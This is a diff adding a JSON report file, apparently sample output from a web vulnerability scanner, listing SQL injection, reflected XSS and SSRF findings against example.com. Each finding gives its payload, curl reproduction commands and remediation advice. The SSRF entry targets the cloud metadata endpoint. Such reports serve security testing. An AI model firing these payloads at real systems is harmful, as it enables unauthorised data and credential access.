@@ -1,0 +1,95 @@
+{
+  "scan_info": {
+    "target": "https://example.com",
+    "mode": "deep",
+    "started_at": "2024-01-15T10:30:00Z",
+    "completed_at": "2024-01-15T11:05:00Z",
+    "duration_seconds": 2100
+  },
+  "summary": {
+    "total_findings": 3,
+    "critical": 1,
+    "high": 1,
+    "medium": 1,
+    "low": 0,
+    "info": 0
+  },
+  "findings": [
+    {
+      "id": "BREACH-001",
+      "title": "SQL Injection in User Search",
+      "severity": "critical",
+      "type": "sqli",
+      "endpoint": "/api/users/search",
+      "parameter": "query",
+      "method": "GET",
+      "payload": "' OR '1'='1",
+      "evidence": {
+        "request": "GET /api/users/search?query=' OR '1'='1 HTTP/1.1",
+        "response_snippet": "You have an error in your SQL syntax...",
+        "data_extracted": "Retrieved 1,247 user records"
+      },
+      "reproduction": {
+        "curl": "curl 'https://example.com/api/users/search?query=%27%20OR%20%271%27=%271'",
+        "verified": true
+      },
+      "remediation": "Use parameterized queries or prepared statements",
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "CWE-89"
+      ]
+    },
+    {
+      "id": "BREACH-002",
+      "title": "Reflected XSS in Search Page",
+      "severity": "high",
+      "type": "xss",
+      "endpoint": "/search",
+      "parameter": "q",
+      "method": "GET",
+      "payload": "<script>alert(1)</script>",
+      "evidence": {
+        "request": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
+        "response_snippet": "<div>Results for: <script>alert(1)</script></div>"
+      },
+      "reproduction": {
+        "curl": "curl 'https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E'",
+        "verified": true
+      },
+      "remediation": "Encode all user input before rendering in HTML",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "CWE-79"
+      ]
+    },
+    {
+      "id": "BREACH-003",
+      "title": "SSRF via URL Parameter",
+      "severity": "medium",
+      "type": "ssrf",
+      "endpoint": "/api/fetch",
+      "parameter": "url",
+      "method": "POST",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "evidence": {
+        "request": "POST /api/fetch HTTP/1.1\n{\"url\": \"http://169.254.169.254/latest/meta-data/\"}",
+        "response_snippet": "ami-id\ninstance-id\nlocal-hostname..."
+      },
+      "reproduction": {
+        "curl": "curl -X POST 'https://example.com/api/fetch' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
+        "verified": true
+      },
+      "remediation": "Validate and whitelist allowed URLs, block internal IPs",
+      "references": [
+        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+        "CWE-918"
+      ]
+    }
+  ],
+  "recon": {
+    "endpoints_discovered": 45,
+    "parameters_found": 12,
+    "technologies": ["PHP", "MySQL", "nginx"],
+    "headers_analyzed": true
+  }
+}
